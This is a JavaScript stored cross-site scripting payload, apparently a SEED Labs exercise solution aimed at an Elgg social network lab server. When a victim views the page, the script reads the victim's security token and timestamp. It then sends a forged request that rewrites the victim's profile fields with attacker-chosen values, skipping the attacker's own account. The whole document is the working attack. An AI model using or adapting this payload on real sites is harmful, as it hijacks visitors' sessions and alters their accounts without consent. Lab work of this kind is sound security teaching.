<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
        var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
	var acc_desc="&accesslevel[description]=1";
	var desc="&description=1905040";
	var brief="&briefdescription=Meh";
	var acc_brief="&accesslevel[briefdescription]=1";
	var location="&location=Gaza";
	var acc_location="&accesslevel[location]=1";
	var interests="&interests=Hacking";
	var acc_interests="&accesslevel[interests]=1";
	var skills="&skills=Nothing";
	var acc_skills="&accesslevel[skills]=1";
	var contactemail="&contactemail=tobey@gmail.com";
	var acc_contactemail="&accesslevel[contactemail]=1";
	var phone="&phone=123456789";
	var acc_phone="&accesslevel[phone]=1";
	var mobile="&mobile=123456789";
	var acc_mobile="&accesslevel[mobile]=1";
	var website="&website=http://ggwp.com";
	var acc_website="&accesslevel[website]=1";
	var twitter="&twitter=Point break";
	var acc_twitter="&accesslevel[twitter]=1";
	var guid="&guid="+elgg.session.user.guid;
	var name="&name="+elgg.session.user.name;
	var content=token+ts+acc_desc+desc+brief+acc_brief+location+acc_location+interests+acc_interests+skills+acc_skills+contactemail+acc_contactemail+phone+acc_phone+mobile+acc_mobile+website+acc_website+twitter+acc_twitter+guid+name;

	
	
	
	
		// var content=...; //FILL IN
	
	if(elgg.session.user.guid!=59)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script>
